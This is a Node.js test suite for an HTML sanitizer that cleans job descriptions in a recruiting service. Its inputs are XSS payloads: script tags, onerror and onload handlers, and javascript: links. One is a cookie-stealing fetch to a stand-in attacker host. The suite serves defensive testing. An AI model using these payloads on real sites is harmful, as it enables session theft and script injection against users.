const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const {
  sanitizeHtml,
  SANITIZE_HTML_OPTIONS,
} = require('../dist/core/utils/sanitize-html.util');
const { JobService } = require('../dist/modules/job/job.service');

describe('Phase 6.4-A: HTML Sanitization Security Hardening Suite', () => {
  describe('1. Core SanitizeHtml: Allowed Formatting and Safe Elements', () => {
    it('should allow benign text and standard formatting tags', () => {
      const input =
        '<p>We are seeking a <strong>Senior Backend Engineer</strong> with expertise in <em>Node.js</em>, <b>PostgreSQL</b>, and <i>TypeScript</i>.</p>' +
        '<ul><li>Design scalable APIs</li><li>Collaborate with cross-functional teams</li></ul>' +
        '<blockquote>Competitive compensation & benefits.</blockquote>';

      const output = sanitizeHtml(input);

      assert.ok(output.includes('<p>'));
      assert.ok(output.includes('<strong>Senior Backend Engineer</strong>'));
      assert.ok(output.includes('<em>Node.js</em>'));
      assert.ok(output.includes('<b>PostgreSQL</b>'));
      assert.ok(output.includes('<i>TypeScript</i>'));
      assert.ok(output.includes('<ul>'));
      assert.ok(output.includes('<li>Design scalable APIs</li>'));
      assert.ok(output.includes('<blockquote>Competitive compensation &amp; benefits.</blockquote>'));
    });

    it('should allow valid http, https, and mailto links', () => {
      const input =
        '<p>Visit <a href="https://example.com/careers">our careers page</a> or email <a href="mailto:jobs@example.com">recruiting</a>.</p>';

      const output = sanitizeHtml(input);

      assert.ok(output.includes('href="https://example.com/careers"'));
      assert.ok(output.includes('href="mailto:jobs@example.com"'));
    });

    it('should inject rel="noopener noreferrer" for links with target="_blank"', () => {
      const input = '<a href="https://example.com" target="_blank">External Link</a>';

      const output = sanitizeHtml(input);

      assert.ok(output.includes('target="_blank"'));
      assert.ok(output.includes('rel="noopener noreferrer"'));
    });

    it('should safely handle empty, null, or non-string input', () => {
      assert.equal(sanitizeHtml(''), '');
      assert.equal(sanitizeHtml(null), '');
      assert.equal(sanitizeHtml(undefined), '');
      assert.equal(sanitizeHtml(123), '');
    });
  });

  describe('2. XSS Mitigation: Script Injection & Execution Payloads', () => {
    it('should strip <script> tags and their entire contents', () => {
      const input = 'We need a developer. <script>alert("xss")</script> Apply now.';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<script'), false);
      assert.equal(output.includes('alert('), false);
      assert.equal(output.includes('xss'), false);
      assert.equal(output, 'We need a developer.  Apply now.');
    });

    it('should strip remote script tags', () => {
      const input = 'Intro <script src="https://evil.example.com/payload.js"></script> Outro';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<script'), false);
      assert.equal(output.includes('evil.example.com'), false);
    });

    it('should handle unclosed or malformed script tags safely', () => {
      const input = 'Text <script src="https://evil.example.com/test.js" <b onmouseover=alert(1)>bold</b>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<script'), false);
      assert.equal(output.includes('onmouseover'), false);
    });

    it('should resist nested script tag bypasses (<scr<script>ipt>) by neutralizing script tags', () => {
      const input = 'Hello <scr<script>ipt>alert(1)</scr</script>ipt> World';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<script'), false);
      assert.equal(output.includes('</script>'), false);
      // Ensure no executable script tag was reconstructed; remaining text is safely entity-encoded
      assert.ok(output.includes('&gt;'));
    });

    it('should handle case variations (<sCrIpt>)', () => {
      const input = 'Start <sCrIpt>alert(document.cookie)</ScRiPt> End';
      const output = sanitizeHtml(input);

      assert.equal(output.toLowerCase().includes('script'), false);
      assert.equal(output.includes('document.cookie'), false);
    });
  });

  describe('3. XSS Mitigation: Event Handlers on All Elements', () => {
    it('should strip inline event handlers from allowed elements', () => {
      const input = '<p onmouseover="alert(\'hover\')">Hover text</p><a href="https://example.com" onclick="steal()">Click</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('onmouseover'), false);
      assert.equal(output.includes('onclick'), false);
      assert.equal(output.includes('steal()'), false);
      assert.ok(output.includes('<p>Hover text</p>'));
      assert.ok(output.includes('<a href="https://example.com">Click</a>'));
    });

    it('should completely strip disallowed elements with event handlers (e.g., img onerror)', () => {
      const input = '<img src="invalid-image" onerror="alert(1)"> Candidate description';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<img'), false);
      assert.equal(output.includes('onerror'), false);
      assert.equal(output.includes('alert(1)'), false);
      assert.equal(output.trim(), 'Candidate description');
    });

    it('should strip body and svg onload handlers', () => {
      const input = '<body onload="alert(1)"><svg onload="alert(2)"><circle r="10"/></svg></body>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<body'), false);
      assert.equal(output.includes('<svg'), false);
      assert.equal(output.includes('onload'), false);
      assert.equal(output.includes('alert('), false);
    });
  });

  describe('4. URL Scheme & Protocol Validation', () => {
    it('should reject javascript: pseudo-protocols in links', () => {
      const input = '<a href="javascript:alert(\'pwned\')">Click for free gift</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('javascript:'), false);
      assert.equal(output.includes('alert('), false);
      assert.equal(output, '<a>Click for free gift</a>');
    });

    it('should reject vbscript: pseudo-protocols in links', () => {
      const input = '<a href="vbscript:msgbox(1)">Click</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('vbscript:'), false);
      assert.equal(output, '<a>Click</a>');
    });

    it('should reject data: URLs in links', () => {
      const input = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('data:'), false);
      assert.equal(output, '<a>Click</a>');
    });

    it('should reject obfuscated or whitespace-encoded javascript: schemes', () => {
      const input = '<a href="java\0script:alert(1)">Click</a><a href="java\tscript:alert(2)">Click</a><a href="JAVASCRIPT:alert(3)">Click</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.toLowerCase().includes('javascript'), false);
      assert.equal(output.includes('alert'), false);
    });

    it('should reject protocol-relative URLs (//evil.com)', () => {
      const input = '<a href="//evil.com/phish">Login here</a>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('//evil.com'), false);
      assert.equal(output, '<a>Login here</a>');
    });
  });

  describe('5. Disallowed Complex Constructs (iframe, object, embed, style, svg, math)', () => {
    it('should discard <iframe> and its contents', () => {
      const input = 'Before <iframe src="https://attacker.example.com">Frame content</iframe> After';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<iframe'), false);
      assert.equal(output.includes('attacker.example.com'), false);
      assert.equal(output.includes('Frame content'), false);
      assert.equal(output, 'Before  After');
    });

    it('should discard <object> and <embed> tags and their contents', () => {
      const input = 'Flash <object data="evil.swf"><param name="movie" value="evil.swf"/></object><embed src="evil.swf"> Demo';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<object'), false);
      assert.equal(output.includes('<embed'), false);
      assert.equal(output.includes('evil.swf'), false);
      assert.equal(output, 'Flash  Demo');
    });

    it('should discard <style> tags and CSS expressions', () => {
      const input = 'Style <style>body { background: red; } .hidden { display: none; }</style> Applied';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<style'), false);
      assert.equal(output.includes('background: red'), false);
      assert.equal(output, 'Style  Applied');
    });

    it('should discard SVG constructs and SVG animation vectors', () => {
      const input =
        'SVG Vector: <svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>' +
        '<svg><set attributeName="href" to="javascript:alert(2)"/><text y="20">Click</text></svg>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<svg'), false);
      assert.equal(output.includes('<animate'), false);
      assert.equal(output.includes('alert('), false);
      assert.equal(output.includes('attributeName'), false);
    });

    it('should discard MathML constructs', () => {
      const input = 'Math: <math href="javascript:alert(1)"><mtext>Click</mtext></math>';
      const output = sanitizeHtml(input);

      assert.equal(output.includes('<math'), false);
      assert.equal(output.includes('javascript:'), false);
    });
  });

  describe('6. Callers: JobService createJob and updateJob Integration', () => {
    const validUserId = 'user-recruiter-1';
    const validJobId = '11111111-1111-4111-8111-111111111111';

    it('should sanitize HTML on createJob when complex XSS payload is provided', async () => {
      let createdJobData = null;
      const mockPrisma = {
        recruiter: {
          findUnique: async () => ({
            id: 'recruiter-profile-1',
            is_approved: true,
            company_id: 'company-uuid-1',
            company: { id: 'company-uuid-1', name: 'TechCorp' },
          }),
        },
        job: {
          create: async ({ data }) => {
            createdJobData = data;
            return {
              id: validJobId,
              status: 'PENDING',
            };
          },
        },
      };

      const service = new JobService(mockPrisma);

      const maliciousDto = {
        title: 'Backend Engineer',
        description:
          'Join our team! <script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>' +
          '<p>We are looking for someone who loves <strong>clean code</strong>.</p>' +
          '<img src="x" onerror="alert(document.domain)">' +
          '<a href="javascript:alert(1)">Click for bonus</a>' +
          '<iframe src="https://evil.com"></iframe>'.padEnd(70, '.'),
        required_skills: ['TypeScript', 'Node.js'],
        employment_type: 'FULL_TIME',
      };

      await service.createJob(validUserId, maliciousDto);

      assert.ok(createdJobData);
      assert.equal(createdJobData.description.includes('<script'), false);
      assert.equal(createdJobData.description.includes('attacker.com'), false);
      assert.equal(createdJobData.description.includes('<img'), false);
      assert.equal(createdJobData.description.includes('onerror'), false);
      assert.equal(createdJobData.description.includes('javascript:'), false);
      assert.equal(createdJobData.description.includes('<iframe'), false);
      // Safe formatting remains intact
      assert.ok(createdJobData.description.includes('<p>We are looking for someone who loves <strong>clean code</strong>.</p>'));
      assert.ok(createdJobData.description.includes('<a>Click for bonus</a>'));
    });

    it('should sanitize HTML on updateJob when complex XSS payload is provided', async () => {
      let updatedJobData = null;
      const mockPrisma = {
        recruiter: {
          findUnique: async () => ({
            id: 'recruiter-profile-1',
            is_approved: true,
            company_id: 'company-uuid-1',
          }),
        },
        job: {
          findUnique: async () => ({
            id: validJobId,
            recruiter_id: 'recruiter-profile-1',
            status: 'ACTIVE',
          }),
          update: async ({ data }) => {
            updatedJobData = data;
            return {
              id: validJobId,
              title: 'Updated Title',
              status: 'ACTIVE',
            };
          },
        },
      };

      const service = new JobService(mockPrisma);

      const maliciousUpdateDto = {
        description:
          'Updated description with <svg onload=alert(1)><script>alert(2)</script></svg>' +
          '<p>Valid paragraph with <a href="https://legit.com">legit link</a></p>'.padEnd(60, '.'),
      };

      await service.updateJob(validUserId, validJobId, maliciousUpdateDto);

      assert.ok(updatedJobData);
      assert.equal(updatedJobData.description.includes('<svg'), false);
      assert.equal(updatedJobData.description.includes('onload'), false);
      assert.equal(updatedJobData.description.includes('<script'), false);
      assert.equal(updatedJobData.description.includes('alert('), false);
      assert.ok(updatedJobData.description.includes('<p>Valid paragraph with <a href="https://legit.com">legit link</a></p>'));
    });
  });
});
